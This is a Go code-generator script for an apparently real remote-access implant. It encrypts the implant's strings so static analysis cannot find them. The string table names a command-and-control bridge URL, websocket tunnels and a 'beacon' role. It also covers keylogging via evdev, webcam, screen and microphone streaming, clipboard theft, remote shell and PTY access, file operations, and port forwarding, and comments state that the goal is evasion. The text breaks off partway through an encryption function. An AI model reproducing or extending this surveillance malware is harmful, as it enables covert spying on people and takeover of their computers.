//go:build ignore

// gen_stealth.go — generates obfuscated string constants for stealth/obfuscate.go
// Usage: go run gen_stealth.go <hex-key>
// Outputs Go source fragment with pre-XOR'd byte arrays + SHA-256 mode hashes.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
)

// Secrets encrypted via XOR at build time. Every sensitive plaintext literal
// that would otherwise land in .rodata goes here.
var secrets = map[string]string{
	// ── Network / C2 ────────────────────────────────────────
	"EncBridgeURL":     "https://sable-bridge.onrender.com",
	"EncWSPath":        "/ws/fc-sync/",
	"EncTunnelPath":    "/ws/fc-tunnel/",
	"EncPrefixWindows": "PowSolver_",
	"EncPrefixDarwin":  "com.powsolver.agent_",
	"EncPrefixLinux":   "pow-solver-",
	"EncStateFile":     "7a2b3c4d-le64.cache-4",
	"EncLogPrefix":     "[pow-solver]",

	// ── Hardware device paths (Layer 1) ─────────────────────
	"EncDevVideo0":         "/dev/video0",
	"EncDevVideoGlob":      "/dev/video*",
	"EncDevInputEventGlob": "/dev/input/event*",
	"EncDevPtmx":           "/dev/ptmx",
	"EncDevPts":            "/dev/pts/",
	"EncSysClassInput":     "/sys/class/input/%s/device/name",
	"EncDevStdout":         "/dev/stdout",
	"EncDevStderr":         "/dev/stderr",

	// ── Log format strings (Layer 2) ────────────────────────
	"EncLogExec":       "[exec] cmd=%s mode=%s prompt_len=%d",
	"EncLogPTYExited":  "[pty] process exited session=%s",
	"EncLogPTYStarted": "[pty] started session=%s",
	"EncLogPTYClosed":  "[pty] closed session=%s",
	"EncLogTunnelOpen": "%s tunnel opened session=%s port=%d",

	// ── Temp file patterns (Layer 2) ────────────────────────
	"EncTmpFrameJpg":   "frame-*.jpg",
	"EncTmpCaptureJpg": "capture-*.jpg",
	"EncTmpCapturePng": "capture-*.png",
	"EncTmpGrimFrame":  "grim_frame_%d.png",
	"EncTmpRecMp4":     "rec_%s.mp4",

	// ── Error strings leaking capability vocab (Layer 2) ────
	"EncErrNoVideoDev":  "no /dev/video* capture devices found",
	"EncErrGrimMissing": "grim not found; install grim for Wayland screen recording",

	// ── Additional log prefixes (Layer 2, round 2) ──────────
	"EncLogScreenStreamStart": "[screen_stream] started: %dfps %dx%d q=%d",
	"EncLogScreenStreamStop":  "[screen_stream] stopped",
	"EncLogScreenStreamErr":   "[screen_stream] capture error: %v",
	"EncLogWebcamStreamStart": "[webcam_stream_h264] started: device=%s %dx%d q=%d",
	"EncLogWebcamStreamStop":  "[webcam_stream_h264] stopped",
	"EncLogWebcamStreamRate":  "[webcam_stream_h264] %.1f KB/s, %d chunks sent",
	"EncLogRecordGrimWarm":    "[record/grim] warmup failed after 10 attempts ",

	// ── Grim recording log prefix (Layer 2, round 3) ────────
	"EncLogGrimStarted":   "[record/grim] started: %dfps %dx%d audio=%v → %s",
	"EncLogGrimStopped":   "[record/grim] stopped: %s",
	"EncLogGrimCancelled": "[record/grim] cancelled during warmup",
	"EncLogGrimWarmFail":  "[record/grim] warmup attempt %d failed: %v",
	"EncLogGrimWarmAbort": "[record/grim] warmup failed after 10 attempts — aborting",
	"EncLogGrimWarmOK":    "[record/grim] warmup OK, starting ffmpeg pipeline",
	"EncLogGrimStdinErr":  "[record/grim] failed to create stdin pipe: %v",
	"EncLogGrimFFStart":   "[record/grim] ffmpeg start failed: %v",
	"EncLogGrimFFConsec":  "[record/grim] too many consecutive failures (%d), aborting",
	"EncLogGrimPNGErr":    "[record/grim] png→raw conversion failed: %v",
	"EncLogGrimWriteErr":  "[record/grim] write to ffmpeg failed: %v",
	"EncLogGrimShort":     "[record/grim] short frame: got %d bytes, expected %d",
	"EncLogGrimFFErr":     "[record/grim] ffmpeg error: %s",

	// ── External command names (Layer 1: exec.Command argv[0]) ────
	"EncCmdFfmpeg":        "ffmpeg",
	"EncCmdFswebcam":      "fswebcam",
	"EncCmdGrim":          "grim",
	"EncCmdImagesnap":     "imagesnap",
	"EncCmdImport":        "import",
	"EncCmdMaim":          "maim",
	"EncCmdScreencapture": "screencapture",
	"EncCmdScrot":         "scrot",
	"EncCmdShutdown":      "shutdown",
	"EncCmdSips":          "sips",
	"EncCmdSystemctl":     "systemctl",
	"EncCmdWlCopy":        "wl-copy",
	"EncCmdXclip":         "xclip",
	"EncCmdHidutil":       "hidutil",
	"EncCmdPowershell":    "powershell",
	"EncCmdEspeakNg":      "espeak-ng",
	"EncCmdEspeak":        "espeak",
	"EncCmdSpdSay":        "spd-say",
	"EncCmdSay":           "say",

	// ── Keylogger capability strings (Layer 3: evdev) ────────────
	"EncKeylogMethod":      "evdev",
	"EncErrNoKeyboard":     "no keyboard device found in /dev/input/ (needs root)",
	"EncErrNoKeyboardPerm": "could not open any keyboard device (permission denied?)",
	"EncKeyFmtFallback":    "KEY_%d",

	// ── Missed command names ────────────────────────────────
	"EncCmdGnomeScreenshot": "gnome-screenshot",
	"EncCmdSpectacle":       "spectacle",
	"EncCmdPactl":           "pactl",
	"EncCmdAmixer":          "amixer",
	"EncCmdCmdExe":          "cmd.exe",
	"EncCmdWlPaste":         "wl-paste",
	"EncCmdSc":              "sc",
	"EncCmdIpconfig":        "ipconfig",
	"EncCmdIp":              "ip",
	"EncCmdIfconfig":        "ifconfig",
	"EncCmdRg":              "rg",
	"EncCmdGrep":            "grep",

	// ── Round 6: tool-slice literals + audio/clipboard args ──
	"EncErrNoClipboardTool":  "no clipboard tool (xclip/wl-paste)",
	"EncTTSSystemSpeech":     "system.speech",
	"EncAudioGetSinkMute":    "get-sink-mute",
	"EncAudioDefaultSink":    "@DEFAULT_SINK@",
	"EncAudioGetDefaultSink": "get-default-sink",
	"EncAudioMaster":         "Master",
	"EncAudioOffMarker":      "[off]",

	// ── Round 7: URL scheme + local API routes ──────────────
	"EncWSScheme":       "ws://",
	"EncHTTPScheme":     "http://",
	"EncRouteChatNew":   "/api/chat/new",
	"EncRouteChat":      "/api/chat",
	"EncRouteChatSlash": "/api/chat/",

	// ── Error strings (round 3) ─────────────────────────────
	"EncErrFfmpegMissing":    "ffmpeg not found on PATH",
	"EncErrDirectShowDevice": "windows webcam requires a DirectShow device name; list with: ffmpeg -list_devices true -f dshow -i dummy",

	// ── Enumeration / fallback format strings (round 4) ─────
	"EncLogRecFFStartFail":   "[record] ffmpeg start failed: %v",
	"EncLogRecFFNoExit":      "[record] ffmpeg didn't exit after SIGINT, killing",
	"EncLogRecFFErrorS":      "[record] ffmpeg error: %s",
	"EncLogRecFFErrorV":      "[record] ffmpeg error: %v",
	"EncErrGrimUnavailable":  "grim unavailable after 10 retries",
	"EncErrNoScreenshotTool": "no screenshot tool found (tried grim, scrot, import, gnome-screenshot, spectacle, ffmpeg): %s",
	"EncErrNoCaptureTool":    "no screen capture tool (tried grim, scrot, maim, import, ffmpeg): %v: %s",

	// ── Log / error strings with capability vocab (round 5) ──
	"EncLogKeylogStarted":    "[keylog] started",
	"EncLogKeylogStopped":    "[keylog] stopped",
	"EncLogKeylogStartedWin": "[keylog] started (Windows polling)",
	"EncLogKeylogStartedMac": "[keylog] started (macOS hidutil)",
	"EncLogRecStarted":       "[record] started: ffmpeg %v \u2192 %s",
	"EncLogRecStartedWin":    "[record] started \u2192 %s",
	"EncLogRecStopped":       "[record] stopped: %s",
	"EncTmpGrimWarmup":       "grim_warmup_%d.png",
	"EncErrFFStart":          "ffmpeg start: %v",
	"EncErrFFDshow":          "ffmpeg dshow capture failed: %v: %s",
	"EncErrImagesnap":        "imagesnap failed: %v: %s",
	"EncErrScreencapture":    "screencapture: %v: %s",
	"EncErrSips":             "sips convert: %v: %s",
	"EncErrPtyStart":         "pty start: %v",

	// ── Stream names (ws frame labels) ──────────────────────
	"EncStreamKeylog":    "keylog",
	"EncStreamWebcam":    "webcam",
	"EncStreamClipboard": "clipboard",
	"EncStreamTTS":       "tts",
	"EncStreamScreen":    "screen_stream",
	"EncStreamRecord":    "record",
	"EncStreamLiveAudio": "live_audio",

	// ── Round 11: live audio streaming ─────────────────────
	"EncLogAudioStreamStart":   "[live_audio] started: device=%s codec=opus",
	"EncLogAudioStreamStop":    "[live_audio] stopped",
	"EncLogAudioStreamErr":     "[live_audio] capture error: %v",
	"EncLogAudioStreamRate":    "[live_audio] %.1f KB/s, %d chunks sent",
	"EncFFmpegFmtAlsa":         "alsa",
	"EncFFmpegFmtAvfoundation": "avfoundation",
	"EncFFmpegCodecOpus":       "libopus",
	"EncFFmpegFmtOgg":          "ogg",
	"EncAudioDefaultDevice":    "default",
	"EncAudioDshowInput":       "audio=Microphone",
	"EncErrNoAudioDevice":      "no audio input device found",
	// ── Round 11b: fMP4 container (MSE-playable opus) ───────
	"EncFFmpegFmtMp4":     "mp4",
	"EncFFmpegMovflags":   "-movflags",
	"EncFFmpegFragMp4":    "frag_keyframe+empty_moov+default_base_moof",
	"EncFFmpegFragDur":    "-frag_duration",
	"EncFFmpegFragDurVal": "100000",
	"EncFFmpegStrict":     "-strict",
	"EncFFmpegStrictExp":  "experimental",
	"EncAudioMimeMp4":     "audio/mp4; codecs=\"opus\"",
	"EncStreamFmtFmp4":    "fmp4",

	// ── Round 12: dedicated binary media plane ──────────────
	"EncMediaPath":          "/ws/media/",
	"EncMediaRole":          "beacon",
	"EncMediaMimeH264":      "video/mp4; codecs=\"avc1.42E01F\"",
	"EncMediaMimeOpus":      "audio/mp4; codecs=\"opus\"",
	"EncMediaMimeJpeg":      "image/jpeg",
	"EncFFmpegFmtGdigrab":   "gdigrab",
	"EncFFmpegFmtImagePipe": "image2pipe",
	"EncFFmpegInputDesktop": "desktop",
	"EncFFmpegGdigInput":    "-i",

	// ── HTTP route fragments (beacon-side) ──────────────────
	"EncRouteMonitorEvents": "events",
	"EncRouteMonitorProbe":  "probe",
	"EncRouteMonitorClear":  "clear",
	"EncRouteMonitorAlive":  "alive",

	// ── keyMap key names (Layer 4: evdev key codes) ─────────
	"EncK01": "ESC", "EncK02": "1", "EncK03": "2", "EncK04": "3", "EncK05": "4",
	"EncK06": "5", "EncK07": "6", "EncK08": "7", "EncK09": "8", "EncK10": "9",
	"EncK11": "0", "EncK12": "-", "EncK13": "=", "EncK14": "BACKSPACE", "EncK15": "TAB",
	"EncK16": "q", "EncK17": "w", "EncK18": "e", "EncK19": "r", "EncK20": "t",
	"EncK21": "y", "EncK22": "u", "EncK23": "i", "EncK24": "o", "EncK25": "p",
	"EncK26": "[", "EncK27": "]", "EncK28": "ENTER", "EncK29": "LCTRL", "EncK30": "a",
	"EncK31": "s", "EncK32": "d", "EncK33": "f", "EncK34": "g", "EncK35": "h",
	"EncK36": "j", "EncK37": "k", "EncK38": "l", "EncK39": ";", "EncK40": "'",
	"EncK41": "`", "EncK42": "LSHIFT", "EncK43": "\\", "EncK44": "z", "EncK45": "x",
	"EncK46": "c", "EncK47": "v", "EncK48": "b", "EncK49": "n", "EncK50": "m",
	"EncK51": ",", "EncK52": ".", "EncK53": "/", "EncK54": "RSHIFT", "EncK55": "KP*",
	"EncK56": "LALT", "EncK57": "SPACE", "EncK58": "CAPSLOCK",
	"EncK59": "F1", "EncK60": "F2", "EncK61": "F3", "EncK62": "F4", "EncK63": "F5", "EncK64": "F6",
	"EncK65": "F7", "EncK66": "F8", "EncK67": "F9", "EncK68": "F10",
	"EncK69": "NUMLOCK", "EncK70": "SCROLLLOCK",
	"EncK71": "KP7", "EncK72": "KP8", "EncK73": "KP9", "EncK74": "KP-",
	"EncK75": "KP4", "EncK76": "KP5", "EncK77": "KP6", "EncK78": "KP+",
	"EncK79": "KP1", "EncK80": "KP2", "EncK81": "KP3", "EncK82": "KP0", "EncK83": "KP.",
	"EncK87": "F11", "EncK88": "F12",
	"EncK96": "KPENTER", "EncK97": "RCTRL", "EncK98": "KP/",
	"EncK100": "RALT", "EncK102": "HOME", "EncK103": "UP", "EncK104": "PAGEUP",
	"EncK105": "LEFT", "EncK106": "RIGHT", "EncK107": "END", "EncK108": "DOWN", "EncK109": "PAGEDOWN",
	"EncK110": "INSERT", "EncK111": "DELETE",
	"EncK119": "PAUSE", "EncK125": "LWIN", "EncK126": "RWIN", "EncK127": "COMPOSE",

	// ── Round 8: JSON response map keys (diagnostics/record/stream) ──
	// These are the map[string]any keys used in C2 responses.
	// Previously plaintext in .rodata — caught by static analysis.
	"EncKeyOS":           "os",
	"EncKeyArch":         "arch",
	"EncKeyUser":         "user",
	"EncKeyErrors":       "errors",
	"EncKeyScreenshot":   "screenshot",
	"EncKeyWebcam":       "webcam",
	"EncKeyClipboard":    "clipboard",
	"EncKeyTTS":          "tts",
	"EncKeyAudio":        "audio",
	"EncKeyServices":     "services",
	"EncKeyRecording":    "recording",
	"EncKeyAvailable":    "available",
	"EncKeyBackend":      "backend",
	"EncKeyDevices":      "devices",
	"EncKeyEngine":       "engine",
	"EncKeyMuted":        "muted",
	"EncKeySink":         "sink",
	"EncKeySystemd":      "systemd",
	"EncKeyUserSystemd":  "user_systemd",
	"EncKeySCM":          "scm",
	"EncKeyStatus":       "status",
	"EncKeyFile":         "file",
	"EncKeyDuration":     "duration",
	"EncKeySize":         "size",
	"EncKeyFPS":          "fps",
	"EncKeyWidth":        "width",
	"EncKeyHeight":       "height",
	"EncKeySource":       "source",
	"EncKeyQuality":      "quality",
	"EncKeyFrame":        "frame",
	"EncKeyStream":       "stream",
	"EncKeyContent":      "content",
	"EncKeyFormat":       "format",
	"EncKeyMime":         "mime",
	"EncKeyTimestamp":    "timestamp",
	"EncKeyAction":       "action",
	"EncKeyError":        "error",
	"EncKeyName":         "name",
	"EncKeyProcesses":    "processes",
	"EncKeyPorts":        "ports",
	"EncKeyMode":         "mode",
	"EncKeyExitCode":     "exit_code",
	"EncKeyOutput":       "output",
	"EncKeyResult":       "result",
	"EncKeyCommandID":    "command_id",
	"EncKeyTargetID":     "target_id",
	"EncKeyHostname":     "hostname",
	"EncKeyPlatform":     "platform",
	"EncKeyEngineType":   "engine_type",
	"EncKeyType":         "type",
	"EncKeyData":         "data",
	"EncKeyPrompt":       "prompt",
	"EncKeyCmd":          "cmd",
	"EncKeyTransferID":   "transfer_id",
	"EncKeyFilename":     "filename",
	"EncKeyChunked":      "chunked",
	"EncKeySeq":          "seq",
	"EncKeyChunk":        "chunk",
	"EncKeyDone":         "done",
	"EncKeyPath":         "path",
	"EncKeyCount":        "count",
	"EncKeyEntries":      "entries",
	"EncKeyResults":      "results",
	"EncKeyTool":         "tool",
	"EncKeyRaw":          "raw",
	"EncKeyWritten":      "written",
	"EncKeyDeleted":      "deleted",
	"EncKeyMoved":        "moved",
	"EncKeyCreated":      "created",
	"EncKeySrc":          "src",
	"EncKeyDest":         "dest",
	"EncKeyStarted":      "started",
	"EncKeyStopped":      "stopped",
	"EncKeyNotRecording": "not_recording",
	"EncKeyTrue":         "true",
	"EncKeyFalse":        "false",
	"EncKeyGdiBitblt":    "gdi_bitblt",
	"EncKeyWin32Native":  "win32_native",
	"EncKeyDesktop":      "desktop",

	// ── Round 9: Encrypted JSON keys (output + parsing) ─────
	"EncKeyChatID":      "chat_id",
	"EncKeyCols":        "cols",
	"EncKeyID":          "id",
	"EncKeyInterfaces":  "interfaces",
	"EncKeyIsDir":       "is_dir",
	"EncKeyModified":    "modified",
	"EncKeyPadding":     "padding",
	"EncKeyMetrics":     "m",
	"EncKeyPermissions": "permissions",
	"EncKeyReply":       "reply",
	"EncKeyRows":        "rows",
	"EncKeySessionID":   "session_id",

	// ── Round 9: WS message types ───────────────────────────
	"EncMsgFileChunk": "file_chunk",
	"EncMsgHeartbeat": "heartbeat",
	"EncMsgResult":    "result",

	// ── Round 9: Encrypted values ───────────────────────────
	"EncValAllReset":     "all_reset",
	"EncValConnected":    "connected",
	"EncValCreated":      "created",
	"EncValDeleted":      "deleted",
	"EncValDisconnected": "disconnected",
	"EncValExecuting":    "executing",
	"EncValGrep":         "grep",
	"EncValInvalidCmd":   "invalid command",
	"EncValLLM":          "llm",
	"EncValMoved":        "moved",
	"EncValOK":           "ok",
	"EncValPowershell":   "powershell",
	"EncValReset":        "reset",
	"EncValRipgrep":      "ripgrep",
	"EncValSable":        "sable",
	"EncValShell":        "shell",
	"EncValWritten":      "written",

	// ── Round 9: tunnel, monitor, replay struct tag leaks ──────
	"EncKeyPort":          "port",
	"EncKeyHost":          "host",
	"EncKeyPid":           "pid",
	"EncKeyAlive":         "alive",
	"EncKeyReplayID":      "replay_id",
	"EncKeyMessage":       "message",
	"EncKeyRegisteredAt":  "registered_at",
	"EncKeyLastHeartbeat": "last_heartbeat",
	"EncKeyAgeSeconds":    "age_seconds",
	"EncKeyMetadata":      "metadata",
	"EncKeyStartedAt":     "started_at",
	"EncKeyStoppedAt":     "stopped_at",
	"EncValError":         "error",
	"EncValStarted":       "started",
	"EncValClosed":        "closed",

	// ── Round 9b: tunnel raw strings ──────────────────────────
	"EncHTTPSScheme":      "https://",
	"EncWSSSecureScheme":  "wss://",
	"EncLocalhost":        "127.0.0.1",
	"EncLogTunnelClose":   "%s tunnel closed session=%s",
	"EncErrTCPDial":       "tcp dial failed: %v",
	"EncErrTransferTrunc": "transfer truncated: %d of %d bytes",
	"EncErrTransferRead":  "transfer read failed: %v",
	"EncRoleBeacon":       "?role=beacon",
	"EncTCP":              "tcp",

	// ── Round 10: position / identity + capture-capability leaks ──
	// Bare strings that fingerprint the host or betray the surveillance
	// surface. Second layer beneath garble -literals.
	"EncLogStartup":   "%s started id=%s host=%s",
	"EncUnknown":      "unknown",
	"EncPersistDir":   "system",
	"EncTimestampFmt": "20060102_150405",

	// /proc & sysfs paths (host telemetry fingerprint)
	"EncProcStat":    "/proc/stat",
	"EncProcUptime":  "/proc/uptime",
	"EncProcLoadavg": "/proc/loadavg",
	"EncProcMeminfo": "/proc/meminfo",
	"EncBatteryPath": "/sys/class/power_supply/BAT0/capacity",
	"EncX11SockDir":  "/tmp/.X11-unix",

	// process / port enumeration commands (reveal host activity)
	"EncCmdPs":      "ps",
	"EncArgPsAux":   "aux",
	"EncArgPsSort":  "--sort=-%cpu",
	"EncCmdSs":      "ss",
	"EncCmdNetstat": "netstat",
	"EncArgTlnp":    "-tlnp",

	// ffmpeg capture argv (reveals screen/webcam capability)
	"EncFFmpegFmtX11":     "x11grab",
	"EncFFmpegFmtDshow":   "dshow",
	"EncFFmpegFmtGdi":     "gdigrab",
	"EncFFmpegFmtAvf":     "avfoundation",
	"EncFFmpegFmtV4l2":    "v4l2",
	"EncFFmpegFmtPulse":   "pulse",
	"EncFFmpegCodecH264":  "libx264",
	"EncFFmpegPixFmt":     "yuv420p",
	"EncFFmpegRawVideo":   "rawvideo",
	"EncFFmpegPixRgb24":   "rgb24",
	"EncFFmpegPresetUF":   "ultrafast",
	"EncFFmpegCodecAac":   "aac",
	"EncFFmpegHideBanner": "-hide_banner",
	"EncFFmpegLoglevel":   "-loglevel",
	"EncFFmpegPipe0":      "pipe:0",
	"EncFFmpegPipe1":      "pipe:1",
	"EncFFmpegDevDarwin":  "0:0",
	"EncFFmpegInputNone":  "1:none",
	"EncFFmpegInputDev":   "1:0",
	"EncX11Display":       ":0.0",
	"EncX11Root":          "root",
	"EncVideoSizeDefault": "1920x1080",
}

// Ordered for deterministic output.
var order = []string{
	"EncBridgeURL", "EncWSPath", "EncTunnelPath", "EncPrefixWindows", "EncPrefixDarwin",
	"EncPrefixLinux", "EncStateFile", "EncLogPrefix",
	"EncDevVideo0", "EncDevVideoGlob", "EncDevInputEventGlob", "EncDevPtmx", "EncDevPts",
	"EncSysClassInput", "EncDevStdout", "EncDevStderr",
	"EncLogExec", "EncLogPTYExited", "EncLogPTYStarted", "EncLogPTYClosed", "EncLogTunnelOpen",
	"EncTmpFrameJpg", "EncTmpCaptureJpg", "EncTmpCapturePng", "EncTmpGrimFrame", "EncTmpRecMp4",
	"EncErrNoVideoDev", "EncErrGrimMissing",
	"EncLogScreenStreamStart", "EncLogScreenStreamStop", "EncLogScreenStreamErr",
	"EncLogWebcamStreamStart", "EncLogWebcamStreamStop", "EncLogWebcamStreamRate",
	"EncLogRecordGrimWarm",
	"EncLogGrimStarted", "EncLogGrimStopped", "EncLogGrimCancelled", "EncLogGrimWarmFail",
	"EncLogGrimWarmAbort", "EncLogGrimWarmOK", "EncLogGrimStdinErr", "EncLogGrimFFStart",
	"EncLogGrimFFConsec", "EncLogGrimPNGErr", "EncLogGrimWriteErr", "EncLogGrimShort",
	"EncLogGrimFFErr",
	// External command names
	"EncCmdFfmpeg", "EncCmdFswebcam", "EncCmdGrim", "EncCmdImagesnap", "EncCmdImport",
	"EncCmdMaim", "EncCmdScreencapture", "EncCmdScrot", "EncCmdShutdown", "EncCmdSips",
	"EncCmdSystemctl", "EncCmdWlCopy", "EncCmdXclip", "EncCmdHidutil", "EncCmdPowershell",
	"EncCmdEspeakNg", "EncCmdEspeak", "EncCmdSpdSay", "EncCmdSay",
	// Keylogger capability strings
	"EncKeylogMethod", "EncErrNoKeyboard", "EncErrNoKeyboardPerm", "EncKeyFmtFallback",
	// Missed command names
	"EncCmdGnomeScreenshot", "EncCmdSpectacle", "EncCmdPactl", "EncCmdAmixer", "EncCmdCmdExe", "EncCmdWlPaste",
	"EncCmdSc", "EncCmdIpconfig", "EncCmdIp", "EncCmdIfconfig", "EncCmdRg", "EncCmdGrep",
	// Round 6
	"EncErrNoClipboardTool", "EncTTSSystemSpeech", "EncAudioGetSinkMute", "EncAudioDefaultSink",
	"EncAudioGetDefaultSink", "EncAudioMaster", "EncAudioOffMarker",
	// Round 7
	"EncWSScheme", "EncHTTPScheme", "EncRouteChatNew", "EncRouteChat", "EncRouteChatSlash",
	// Error strings (round 3)
	"EncErrFfmpegMissing", "EncErrDirectShowDevice",
	// Enumeration / fallback format strings (round 4)
	"EncLogRecFFStartFail", "EncLogRecFFNoExit", "EncLogRecFFErrorS", "EncLogRecFFErrorV",
	"EncErrGrimUnavailable", "EncErrNoScreenshotTool", "EncErrNoCaptureTool",
	// Log / error strings with capability vocab (round 5)
	"EncLogKeylogStarted", "EncLogKeylogStopped", "EncLogKeylogStartedWin", "EncLogKeylogStartedMac",
	"EncLogRecStarted", "EncLogRecStartedWin", "EncLogRecStopped", "EncTmpGrimWarmup",
	"EncErrFFStart", "EncErrFFDshow", "EncErrImagesnap", "EncErrScreencapture", "EncErrSips", "EncErrPtyStart",
	// Stream names
	"EncStreamKeylog", "EncStreamWebcam", "EncStreamClipboard", "EncStreamTTS",
	"EncStreamScreen", "EncStreamRecord", "EncStreamLiveAudio",
	// Round 11: live audio
	"EncLogAudioStreamStart", "EncLogAudioStreamStop", "EncLogAudioStreamErr", "EncLogAudioStreamRate",
	"EncFFmpegFmtAlsa", "EncFFmpegFmtAvfoundation", "EncFFmpegCodecOpus", "EncFFmpegFmtOgg",
	"EncAudioDefaultDevice", "EncAudioDshowInput", "EncErrNoAudioDevice",
	"EncFFmpegFmtMp4", "EncFFmpegMovflags", "EncFFmpegFragMp4", "EncFFmpegFragDur",
	"EncFFmpegFragDurVal", "EncFFmpegStrict", "EncFFmpegStrictExp", "EncAudioMimeMp4", "EncStreamFmtFmp4",
	"EncMediaPath", "EncMediaRole", "EncMediaMimeH264", "EncMediaMimeOpus", "EncMediaMimeJpeg",
	"EncFFmpegFmtGdigrab", "EncFFmpegFmtImagePipe", "EncFFmpegInputDesktop", "EncFFmpegGdigInput",
	// HTTP route fragments
	"EncRouteMonitorEvents", "EncRouteMonitorProbe", "EncRouteMonitorClear", "EncRouteMonitorAlive",
	// keyMap key names
	"EncK01", "EncK02", "EncK03", "EncK04", "EncK05", "EncK06", "EncK07", "EncK08", "EncK09", "EncK10",
	"EncK11", "EncK12", "EncK13", "EncK14", "EncK15", "EncK16", "EncK17", "EncK18", "EncK19", "EncK20",
	"EncK21", "EncK22", "EncK23", "EncK24", "EncK25", "EncK26", "EncK27", "EncK28", "EncK29", "EncK30",
	"EncK31", "EncK32", "EncK33", "EncK34", "EncK35", "EncK36", "EncK37", "EncK38", "EncK39", "EncK40",
	"EncK41", "EncK42", "EncK43", "EncK44", "EncK45", "EncK46", "EncK47", "EncK48", "EncK49", "EncK50",
	"EncK51", "EncK52", "EncK53", "EncK54", "EncK55", "EncK56", "EncK57", "EncK58",
	"EncK59", "EncK60", "EncK61", "EncK62", "EncK63", "EncK64", "EncK65", "EncK66", "EncK67", "EncK68",
	"EncK69", "EncK70", "EncK71", "EncK72", "EncK73", "EncK74", "EncK75", "EncK76", "EncK77", "EncK78",
	"EncK79", "EncK80", "EncK81", "EncK82", "EncK83", "EncK87", "EncK88",
	"EncK96", "EncK97", "EncK98", "EncK100", "EncK102", "EncK103", "EncK104", "EncK105", "EncK106",
	"EncK107", "EncK108", "EncK109", "EncK110", "EncK111", "EncK119", "EncK125", "EncK126", "EncK127",
	// Round 8: JSON response map keys
	"EncKeyOS", "EncKeyArch", "EncKeyUser", "EncKeyErrors",
	"EncKeyScreenshot", "EncKeyWebcam", "EncKeyClipboard", "EncKeyTTS",
	"EncKeyAudio", "EncKeyServices", "EncKeyRecording",
	"EncKeyAvailable", "EncKeyBackend", "EncKeyDevices", "EncKeyEngine",
	"EncKeyMuted", "EncKeySink", "EncKeySystemd", "EncKeyUserSystemd", "EncKeySCM",
	"EncKeyStatus", "EncKeyFile", "EncKeyDuration", "EncKeySize",
	"EncKeyFPS", "EncKeyWidth", "EncKeyHeight", "EncKeySource", "EncKeyQuality",
	"EncKeyFrame", "EncKeyStream", "EncKeyContent", "EncKeyFormat", "EncKeyMime", "EncKeyTimestamp",
	"EncKeyAction", "EncKeyError", "EncKeyName",
	"EncKeyProcesses", "EncKeyPorts", "EncKeyMode", "EncKeyExitCode", "EncKeyOutput",
	"EncKeyResult", "EncKeyCommandID", "EncKeyTargetID", "EncKeyHostname", "EncKeyPlatform",
	"EncKeyEngineType", "EncKeyType", "EncKeyData", "EncKeyPrompt", "EncKeyCmd",
	"EncKeyTransferID", "EncKeyFilename", "EncKeyChunked", "EncKeySeq", "EncKeyChunk", "EncKeyDone",
	"EncKeyPath", "EncKeyCount", "EncKeyEntries", "EncKeyResults", "EncKeyTool", "EncKeyRaw",
	"EncKeyWritten", "EncKeyDeleted", "EncKeyMoved", "EncKeyCreated", "EncKeySrc", "EncKeyDest",
	"EncKeyStarted", "EncKeyStopped", "EncKeyNotRecording",
	"EncKeyTrue", "EncKeyFalse",
	"EncKeyGdiBitblt", "EncKeyWin32Native", "EncKeyDesktop",
	// Round 9: JSON keys (chat/fs/session)
	"EncKeyChatID", "EncKeyCols", "EncKeyID", "EncKeyInterfaces", "EncKeyIsDir",
	"EncKeyMetrics", "EncKeyModified", "EncKeyPadding", "EncKeyPermissions", "EncKeyReply", "EncKeyRows", "EncKeySessionID",
	// Round 9: WS message types
	"EncMsgFileChunk", "EncMsgHeartbeat", "EncMsgResult",
	// Round 9: encrypted values
	"EncValAllReset", "EncValConnected", "EncValCreated", "EncValDeleted", "EncValDisconnected",
	"EncValExecuting", "EncValGrep", "EncValInvalidCmd", "EncValLLM", "EncValMoved", "EncValOK",
	"EncValPowershell", "EncValReset", "EncValRipgrep", "EncValSable", "EncValShell", "EncValWritten",
	// Round 9b: tunnel, monitor, replay struct tag leaks
	"EncKeyPort", "EncKeyHost", "EncKeyPid", "EncKeyAlive", "EncKeyReplayID", "EncKeyMessage",
	"EncKeyRegisteredAt", "EncKeyLastHeartbeat", "EncKeyAgeSeconds", "EncKeyMetadata",
	"EncKeyStartedAt", "EncKeyStoppedAt", "EncValError", "EncValStarted", "EncValClosed",
	// Round 9b: tunnel raw strings
	"EncHTTPSScheme", "EncWSSSecureScheme", "EncLocalhost", "EncLogTunnelClose",
	"EncErrTCPDial", "EncErrTransferTrunc", "EncErrTransferRead", "EncRoleBeacon", "EncTCP",
	// Round 10: position / identity + capture-capability leaks
	"EncLogStartup", "EncUnknown", "EncPersistDir", "EncTimestampFmt",
	"EncProcStat", "EncProcUptime", "EncProcLoadavg", "EncProcMeminfo", "EncBatteryPath", "EncX11SockDir",
	"EncCmdPs", "EncArgPsAux", "EncArgPsSort", "EncCmdSs", "EncCmdNetstat", "EncArgTlnp",
	"EncFFmpegFmtX11", "EncFFmpegFmtDshow", "EncFFmpegFmtGdi", "EncFFmpegFmtAvf", "EncFFmpegFmtV4l2", "EncFFmpegFmtPulse",
	"EncFFmpegCodecH264", "EncFFmpegPixFmt", "EncFFmpegRawVideo", "EncFFmpegPixRgb24", "EncFFmpegPresetUF", "EncFFmpegCodecAac",
	"EncFFmpegHideBanner", "EncFFmpegLoglevel", "EncFFmpegPipe0", "EncFFmpegPipe1", "EncFFmpegDevDarwin", "EncFFmpegInputNone", "EncFFmpegInputDev",
	"EncX11Display", "EncX11Root", "EncVideoSizeDefault",
}

// Command modes that live in switch cases. We emit SHA-256 hashes so the
// plaintext never lands in .rodata. The bridge still sends plaintext JSON;
// the beacon hashes at dispatch time.
var commandModes = []string{
	"shell", "powershell",
	"fs_list", "fs_download", "fs_write", "fs_delete", "fs_move", "fs_mkdir", "fs_search",
	"diagnostics", "telemetry", "ps", "kill", "power", "service",
	"net_ports", "net_info",
	"screenshot", "webcam", "webcam_list", "webcam_stream", "screen_stream", "record",
	"keylog", "clipboard", "tts", "live_audio",
	"llm", "llm_reset",
	"pty_connect", "pty_disconnect",
	"port_forward", "port_close",
}

// Source values used by record's inner switch (screen|webcam|both).
var sourceModes = []string{"screen", "webcam", "both"}

// seal encrypts plain with AES-256-GCM, returning nonce || ciphertext || tag.
func seal(key, plain []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}
